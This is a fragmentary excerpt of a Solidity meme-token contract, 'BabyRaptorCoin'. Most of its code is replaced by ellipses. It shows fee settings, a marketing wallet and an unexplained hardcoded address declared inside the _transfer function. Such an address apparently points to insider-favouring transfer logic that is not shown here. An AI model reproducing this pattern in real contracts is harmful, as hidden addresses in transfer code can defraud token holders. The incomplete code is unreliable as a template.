...
contract BabyRaptorCoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "Baby Raptor"; // 
    string private constant _symbol = "BabyRaptor"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 0;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x5cb361ec5B643045F9C67b4b67709526e526739b;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xE889Df969A24c8fc1980F45a8675fdB4307A70C1;
